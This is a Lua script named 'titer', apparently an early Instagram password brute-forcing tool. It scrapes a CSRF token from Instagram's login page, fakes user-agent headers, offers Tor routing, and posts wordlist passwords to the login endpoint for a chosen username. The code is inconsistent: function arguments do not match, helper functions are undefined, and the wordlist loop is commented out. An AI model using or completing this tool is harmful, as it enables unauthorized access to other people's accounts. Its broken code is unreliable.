#!/usr/bin/lua
local argparse = require('argparse') 
local http = require('socket.http') 
local ltn = require('ltn12')
local lib = require("lib/lib")
local json = require("cjson")

local titer = [[
                `         '
;,,,             `       '             ,,,;
`YES8888bo.       :     :       .od8888YES'
  888IO8DO88b.     :   :     .d8888I8DO88
  8LOVEY'  `Y8b.   `   '   .d8Y'  `YLOVE8
 jTHEE!  .db.  Yb. '   ' .dY  .db.  8THEE!
   `888  Y88Y    `b ( ) d'    Y88Y  888'
    8MYb  '"        ,',        "'  dMY8
   j8prECIOUSgf"'   ':'   `"?g8prECIOUSk
     'Y'   .8'     d' 'b     '8.   'Y'
      !   .8' db  d'; ;`b  db '8.   !
         d88  `'  8 ; ; 8  `'  88b
        d88Ib   .g8 ',' 8g.   dI88b
       :888LOVE88Y'     'Y88LOVE888:
       '! THEE888'       `888THEE !'
          '8Y  `Y         Y'  Y8'
           Y                   Y
           !                   !
  https://github.com/sudurraaa/titer
]]

local request_payload = [[queryParams={}&optIntoOneTap=false]]
local csrf = nil
local request_headers = nil

local function attack(password, tor)
	-- Generating fake user agent
	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":" .. password
	request_headers["User-Agent"] = fake_Agent()
	
	print(request_payload)
	Wait(3)
	for x,v in pairs(request_headers) do
		print(x .. " " .. v)
	end

	local attack_response = {}
	http.request {
		url = "https://instagram.com/accounts/login/ajax/",
		method = "POST",
		headers = request_headers,
		source = ltn.source.string(request_payload),
		sink = ltn.sink.table(attack_response)
	}

	for _,resp in pairs(attack_response) do
		print(resp)
	end
end

local function main()
    local parser = argparse() {
    	name = "titer",
    	description = titer,
    	epilog = "Usage: titer -t blackarch -w wordlist.txt -p disable"
    }
    parser:option('-t --target', "Specify target instagram username")
    parser:option('-w --wordlist', "Specify wordlist file path")
    parser:option('-p --proxy', "Enable or Disable tor service")
    	:choices {"enable", "disable"}
    parser:flag('-v --version', "Get current version of soft"):action(function()
    	print("titer v1.0.0(alpha)")
    	os.exit(0)
    end)
    parser:flag('-a --asci', 'Print titer ascii'):action(function()
    	print(titer)
    	os.exit(0)
    end)
    local args = parser:parse()
    request_payload = request_payload .. "&username=sudopacmandeleteme"
    -- Making http request to instagram to get csrf token
    local body,code,headers = http.request {
    	url = "https://instagram.com/accounts/login/",
    	method = "GET",
    	headers = request_headers,
    }
    for _,cooks in pairs(headers) do
    	if cooks:find("csrftoken") then
    		csrf = cooks:match('csrftoken=.*'):sub(11, -485)
    		print(csrf)
    		--request_headers["x-csrftoken"] = csrf
    		break
    	end
    end
    request_headers = {
    	["content-type"] = "application/x-www-form-urlencoded",
    	["X-Requested-With"] = "XMLHttpRequest",
    	["Referer"] = "http://www.instagram.com/accounts/login",
    	["x-csrftoken"] = csrf,
    	["User-Agent"] = fake_Agents()
    }
    -- Checking if --wordlist exist TODO find better way with argparse
    --[[local open = io.open(args.wordlist, 'r')
    if open then
    	open:close()
    	for brute in io.lines(args.wordlist) do
    		attack(args.target, brute, args.proxy)
    	end
    else
    	print("[-] " .. args.wordlist .. " file path doesn't found\n[+] trying to open" .. args.wordlist .. ".txt file")
    	local open_txt = io.open(args.wordlist .. ".txt")
    	if open_txt then
    		for brute in io.lines(args.wordlist .. ".txt") do
    			attack(args.target, brute, args.proxy)
    		end
    	else
    		print("[-] wordlist file path doesn't found")
    		os.exit(0)
    		end
    end]]--
    attack("sudopacmandeleteme", "sudopacmandeleteme17G", "disable")
end

main()
